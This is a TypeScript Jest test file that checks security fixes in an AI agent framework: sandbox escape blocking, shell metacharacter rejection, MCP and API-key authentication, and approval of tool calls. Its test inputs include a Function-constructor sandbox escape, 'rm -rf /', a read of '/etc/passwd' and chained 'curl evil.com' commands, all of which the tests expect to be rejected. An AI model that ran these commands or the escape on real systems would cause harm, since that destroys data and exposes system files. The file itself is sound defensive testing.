/**
 * Security hardening tests for GHSA advisory fixes
 */

import http from 'http';
import {
  CommandValidator,
  containsShellMetacharacters,
} from '../../src/cli/features/sandbox-executor';
import { MCPSecurity, createApiKeyPolicy } from '../../src/mcp/security';
import { MCPServer } from '../../src/mcp/server';
import { codeMode } from '../../src/tools/builtins/code-mode';
import { shell } from '../../src/tools/utility-tools';
import { createAgentLoop } from '../../src/ai/agent-loop';
import { AgentOS } from '../../src/os/agentos';
import { mergeConfig } from '../../src/os/config';

jest.mock('../../src/ai/generate-text', () => ({
  generateText: jest.fn(),
}));

import { generateText } from '../../src/ai/generate-text';

const mockedGenerateText = generateText as jest.MockedFunction<typeof generateText>;

describe('code-mode sandbox', () => {
  test('executes safe code via vm context', async () => {
    const tool = codeMode();
    const result = await tool.execute({ code: 'console.log("hello"); return "done";' });
    expect(result.success).toBe(true);
    expect(result.stdout).toContain('hello');
    expect(result.output).toBe('done');
  });

  test('blocks Function constructor escape', async () => {
    const tool = codeMode();
    const result = await tool.execute({
      code: 'const Fn = (async function(){}).constructor.constructor; Fn("return process")()',
    });
    expect(result.success).toBe(false);
  });

  test('blocks explicit new Function', async () => {
    const tool = codeMode();
    const result = await tool.execute({ code: 'new Function("return 1")()' });
    expect(result.success).toBe(false);
    expect(result.error).toContain('blocked');
  });
});

describe('shell command hardening', () => {
  test('containsShellMetacharacters detects chaining', () => {
    expect(containsShellMetacharacters('ls; rm -rf /')).toBe(true);
    expect(containsShellMetacharacters('echo $(whoami)')).toBe(true);
    expect(containsShellMetacharacters('ls -la')).toBe(false);
  });

  test('shell() rejects metacharacters', async () => {
    const result = await shell('echo ok; cat /etc/passwd');
    expect(result.success).toBe(false);
    expect(result.error).toContain('metacharacters');
  });

  test('shell() rejects allowlist bypass via chaining', async () => {
    const result = await shell('echo safe && curl evil.com');
    expect(result.success).toBe(false);
  });

  test('CommandValidator rejects sh -c chaining bypass', () => {
    const validator = new CommandValidator({ allowedCommands: ['echo'] });
    const result = validator.validate('echo ok; sh -c "curl evil.com"');
    expect(result.valid).toBe(false);
  });

  test('network-isolated mode blocks curl', () => {
    const validator = new CommandValidator({ mode: 'network-isolated' });
    const result = validator.validate('curl https://example.com');
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('network-isolated');
  });
});

describe('MCPSecurity authentication', () => {
  test('basic auth fails closed without validate callback', async () => {
    const security = new MCPSecurity({
      policies: [{
        id: '1',
        name: 'basic-auth',
        type: 'authenticate',
        auth: { method: 'basic' },
      }],
    });

    const result = await security.check({
      headers: { Authorization: 'Basic dXNlcjpwYXNz' },
    });
    expect(result.allowed).toBe(false);
  });

  test('oauth fails closed without validate callback', async () => {
    const security = new MCPSecurity({
      policies: [{
        id: '2',
        name: 'oauth',
        type: 'authenticate',
        auth: { method: 'oauth' },
      }],
    });

    const result = await security.check({
      headers: { Authorization: 'Bearer some-token' },
    });
    expect(result.allowed).toBe(false);
  });

  test('rejects empty bearer token', async () => {
    const security = new MCPSecurity({
      policies: [createApiKeyPolicy('api-key')],
      apiKeys: ['valid-key'],
    });

    const result = await security.check({
      headers: { Authorization: 'Bearer   ' },
    });
    expect(result.allowed).toBe(false);
  });

  test('api-key fails closed when no keys configured', async () => {
    const security = new MCPSecurity({
      policies: [createApiKeyPolicy('api-key')],
    });

    const result = await security.check({
      headers: { Authorization: 'Bearer anything' },
    });
    expect(result.allowed).toBe(false);
  });

  test('accepts valid api key', async () => {
    const security = new MCPSecurity({
      policies: [createApiKeyPolicy('api-key')],
      apiKeys: ['secret-key'],
    });

    const result = await security.check({
      headers: { Authorization: 'Bearer secret-key' },
    });
    expect(result.allowed).toBe(true);
  });
});

describe('MCPServer HTTP auth', () => {
  let server: MCPServer;
  let port: number;

  beforeEach(async () => {
    server = new MCPServer({ authToken: 'mcp-secret', logging: false });
    port = 18000 + Math.floor(Math.random() * 1000);
    await server.startHttp(port);
  });

  afterEach(async () => {
    await server.stop();
  });

  test('POST without token returns 401', async () => {
    const { status } = await postJson(port, { jsonrpc: '2.0', method: 'ping', id: 1 });
    expect(status).toBe(401);
  });

  test('POST with valid bearer token succeeds', async () => {
    const { status, body } = await postJson(
      port,
      { jsonrpc: '2.0', method: 'ping', id: 1 },
      { Authorization: 'Bearer mcp-secret' },
    );
    expect(status).toBe(200);
    expect(body.result).toEqual({});
  });

  test('GET /health remains unauthenticated', async () => {
    const status = await getRequest(port, '/health');
    expect(status).toBe(200);
  });
});

describe('AgentOS API key auth', () => {
  const createMockAgent = () => ({
    name: 'assistant',
    chat: jest.fn().mockResolvedValue('hi'),
  });

  test('mergeConfig reads PRAISONAI_AGENTOS_API_KEY', () => {
    process.env.PRAISONAI_AGENTOS_API_KEY = 'env-key';
    const config = mergeConfig({});
    expect(config.apiKey).toBe('env-key');
    delete process.env.PRAISONAI_AGENTOS_API_KEY;
  });

  test('protected routes require api key when configured', async () => {
    let expressAvailable = true;
    try {
      require('express');
    } catch {
      expressAvailable = false;
    }
    if (!expressAvailable) {
      return;
    }

    const app = new AgentOS({
      agents: [createMockAgent()],
      config: { apiKey: 'agentos-secret', port: 0 },
    });

    const expressApp = app.getApp();
    const server = expressApp.listen(0);
    const address = server.address();
    const port = typeof address === 'object' && address ? address.port : 0;

    try {
      expect(await getRequest(port, '/api/agents')).toBe(401);
      expect(await getRequest(port, '/health')).toBe(200);

      const authed = await getRequest(port, '/api/agents', {
        Authorization: 'Bearer agentos-secret',
      });
      expect(authed).toBe(200);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });
});

describe('AgentLoop onToolCall approval', () => {
  beforeEach(() => {
    mockedGenerateText.mockReset();
  });

  test('onToolCall runs before tool execute', async () => {
    const order: string[] = [];
    const originalExecute = jest.fn(async () => {
      order.push('execute');
      return 'done';
    });

    mockedGenerateText.mockImplementation(async ({ tools }) => {
      await tools!.runAction.execute({ action: 'test' });
      return {
        text: '',
        toolCalls: [],
        toolResults: [],
        usage: { promptTokens: 0, completionTokens: 0, totalTokens: 0 },
        finishReason: 'stop',
        steps: [],
        responseMessages: [],
      };
    });

    const loop = createAgentLoop({
      model: 'gpt-4o-mini',
      tools: {
        runAction: {
          description: 'Run',
          parameters: {},
          execute: originalExecute,
        },
      },
      onToolCall: async () => {
        order.push('approval');
        return true;
      },
    });

    await loop.step();

    expect(order).toEqual(['approval', 'execute']);
  });

  test('rejected tool call does not run original execute', async () => {
    const execute = jest.fn(async () => 'should-not-run');

    mockedGenerateText.mockImplementation(async ({ tools }) => {
      try {
        await tools!.blocked.execute({});
      } catch {
        // expected rejection from wrapped execute
      }

      return {
        text: '',
        toolCalls: [],
        toolResults: [],
        usage: { promptTokens: 0, completionTokens: 0, totalTokens: 0 },
        finishReason: 'error',
        steps: [],
        responseMessages: [],
      };
    });

    const loop = createAgentLoop({
      model: 'gpt-4o-mini',
      tools: {
        blocked: {
          description: 'Blocked',
          parameters: {},
          execute,
        },
      },
      onToolCall: async () => false,
    });

    await loop.step();
    expect(execute).not.toHaveBeenCalled();
  });
});

async function postJson(
  port: number,
  payload: object,
  headers: Record<string, string> = {},
): Promise<{ status: number; body: any }> {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port,
        path: '/',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
          ...headers,
        },
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => {
          resolve({
            status: res.statusCode ?? 0,
            body: body ? JSON.parse(body) : {},
          });
        });
      },
    );
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

async function getRequest(
  port: number,
  path: string,
  headers: Record<string, string> = {},
): Promise<number> {
  return new Promise((resolve, reject) => {
    http.get(
      { hostname: '127.0.0.1', port, path, headers },
      (res) => {
        res.resume();
        resolve(res.statusCode ?? 0);
      },
    ).on('error', reject);
  });
}
